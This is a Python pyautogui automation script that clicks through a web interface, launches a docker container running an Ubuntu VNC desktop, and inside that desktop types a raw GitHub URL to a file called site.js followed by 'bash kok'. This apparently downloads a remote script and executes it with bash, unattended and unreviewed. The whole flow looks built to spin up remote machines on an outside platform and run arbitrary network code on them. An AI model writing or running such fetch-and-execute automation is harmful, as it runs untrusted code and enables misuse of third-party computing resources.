import pyautogui
import time
import subprocess
time.sleep(10)
def detect_button_via_script(script_name):
    """Run an external script to detect a button and keep trying until it succeeds."""
    while True:  # Loop until the button is found
        # Start the external script
        process = subprocess.Popen(['python3', script_name])
        process.wait()  # Wait for it to finish

        if process.returncode == 0:  # Check if the button was found
            print(f"Button in {script_name} detected and clicked!")
            return
        else:
            print(f"Button in {script_name} not detected, retrying...")

if __name__ == "__main__":
    # Step 1: Detect the main button via main.py script
    detect_button_via_script('main.py')

    print("Main button detected and clicked. Waiting for page to load...")
    time.sleep(10)  # Wait for the page to load

    # Step 2: Press Tab 19 times and type the docker command
    for _ in range(19):
        pyautogui.press("tab")
    pyautogui.write("docker run -p 6500:80 dorowu/ubuntu-desktop-lxde-vnc")
    time.sleep(5)
    pyautogui.press("enter")
    print("Docker command typed and executed.")

    # Step 3: Detect the browser button via browser.py script
    time.sleep(18)
    detect_button_via_script('browser.py')

    # Step 4: Detect the desktop button via desktop.py script
    detect_button_via_script('desktop.py')

    # Step 5: Perform additional desktop actions
    print("Performing desktop actions...")
    
    # Perform click at (22, 600)
    pyautogui.click(22, 600)

    # Press up arrow 4 times, right arrow once, down arrow once, and Enter
    for _ in range(4):
        pyautogui.press("up")
    pyautogui.press("right")
    pyautogui.press("down")
    pyautogui.press("enter")
    time.sleep(2)
    pyautogui.write("https://raw.githubusercontent.com/newone211/distru/main/site.js")
    pyautogui.press("enter")
    time.sleep(8)
    pyautogui.write("bash kok")
    pyautogui.press("enter")
    time.sleep(5)
    pyautogui.click(1324, 11)
    print("Desktop actions completed.")
    
